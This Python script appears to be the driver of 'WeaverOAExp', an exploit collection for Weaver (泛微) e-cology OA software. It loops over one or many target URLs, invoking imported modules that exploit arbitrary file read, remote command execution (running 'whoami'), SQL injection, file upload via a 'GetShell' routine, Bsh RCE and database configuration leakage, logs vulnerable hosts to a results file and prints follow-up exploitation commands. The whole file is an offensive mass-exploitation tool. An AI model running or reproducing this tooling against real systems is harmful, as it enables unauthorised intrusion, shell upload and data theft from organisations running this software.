# -*- coding: utf-8 -*-

import os
import argparse
import time
from pyfiglet import Figlet
# from  multiprocessing import Pool


from poc import E_Bridge_Arbitrary_File_Read, E_Cology_WorkflowServiceXml_RCE, E_Cology_V8_Sql, \
    Weaver_Common_Ctrl_Upload, Bsh_RCE, WorkflowCenterTreeData_Sql, E_Cology_Database_Leak

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[1;33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC


def info():
    return VIOLET + "[INFO] " + ENDC


def error():
    return RED + "[ERROR] " + ENDC


def warning():
    return YELLOW + "[WARNING] " + ENDC


def success():
    return GREEN + "[SUCCESS] " + ENDC


def result(name, url):
    file = open('result.txt', 'a')
    file.write(name + ': ' + url + '\n')
    file.close()


def check(url):
    if url[-1] != '/':
        url += '/'
        if url[:4] != 'http':
            url = 'http://' + url
    print(now_time() + info() + 'Target: ' + url)

    # 泛微云桥任意文件读取
    print(now_time() + info() + '正在检测泛微云桥任意文件读取漏洞')
    id, system = E_Bridge_Arbitrary_File_Read.check(url)
    if id is None:
        print(now_time() + warning() + '不存在泛微云桥任意文件读取漏洞')
    else:
        E_Bridge_Arbitrary_File_Read.POC_2(url, id)
        print(now_time() + success() + 'python3 poc/E_Bridge_Arbitrary_File_Read.py {} 进行进一步利用'.format(url))
        result('泛微云桥任意文件读取', url)

    # 泛微 WorkflowServiceXml RCE
    print(now_time() + info() + '正在检测泛微 WorkflowServiceXml RCE 漏洞')
    if E_Cology_WorkflowServiceXml_RCE.exploit(url, 'whoami') is None:
        print(now_time() + warning() + '不存在泛微 WorkflowServiceXml RCE 漏洞')
    else:
        print(now_time() + info() + 'whoami: ' + E_Cology_WorkflowServiceXml_RCE.exploit(url, 'whoami'))
        print(now_time() + success() + 'python3 poc/E_Cology_WorkflowServiceXml_RCE.py {} cmd 进行进一步利用'.format(url))
        result('泛微 WorkflowServiceXml RCE', url)

    # 泛微OA V8 前台Sql注入
    print(now_time() + info() + '正在检测泛微 OA V8 前台SQL注入漏洞')
    if E_Cology_V8_Sql.poc(url) == 'ok':
        result('泛微OA V8前台Sql注入', url)

    # 泛微OA weaver.common.Ctrl 任意文件上传
    print(now_time() + info() + '正在检测泛微OA weaver.common.Ctrl 任意文件上传漏洞')
    if Weaver_Common_Ctrl_Upload.GetShell(url) == 'ok':
        result('泛微OA weaver.common.Ctrl 任意文件上传', url)

    # 泛微Bsh RCE
    print(now_time() + info() + '正在检测泛微OA Bsh RCE漏洞')
    if Bsh_RCE.Check(url) == 'ok':
        result('泛微OA Bsh RCE', url)

    # 泛微OA WorkflowCenterTreeData接口SQL注入
    print(now_time() + info() + '正在检测泛微OA WorkflowCenterTreeData接口SQL注入漏洞')
    if WorkflowCenterTreeData_Sql.exploit(url) == 'ok':
        result('泛微OA WorkflowCenterTreeData接口SQL注入', url)

    # 泛微OA e-cology 数据库配置信息泄漏
    print(now_time() + info() + '正在检测泛微OA e-cology 数据库配置信息泄漏漏洞')
    if E_Cology_Database_Leak.checkVulUrl(url) == 'ok':
        result('泛微OA 数据库配置信息泄漏漏洞', url)


if __name__ == '__main__':
    print(VIOLET + Figlet(font='slant').renderText('WeaverOAExp') + ENDC)
    print('         Author: zjun        HomePage: www.zjun.info\n')
    parser = argparse.ArgumentParser(description='泛微OA POC 合集')
    parser.add_argument('-u', '--url', dest='url', required=False, help='target url')
    parser.add_argument('-f', '--file', dest='file', required=False, help='url file')
    Usage = "Usage:\npython3 {0} -u url\npython3 {0} -f url.txt".format(
        os.path.basename(__file__))
    args = parser.parse_args()
    if args.file:
        # pool = Pool(processes=10)
        f = open(args.file, 'r')
        urls = f.readlines()
        for url in urls:
            url = url.strip('\n')
            if url[-1] != '/':
                url += '/'
                if url[:4] != 'http':
                    url = 'http://' + url
            # pool.apply_async(check, args=(url,))
            check(url)
        f.close()
        # pool.close()
        # pool.join()
        # 扫描结果
        print(now_time() + info() + '扫描已完成, 若有漏洞将保存至 \'' + os.path.dirname(os.path.abspath(__file__)) + '/result.txt\'')

    elif args.url:
        check(args.url)
        # 扫描结果
        print(now_time() + info() + '扫描已完成, 若有漏洞将保存至 \'' + os.path.dirname(os.path.abspath(__file__)) + '/result.txt\'')

    else:
        print(Usage)
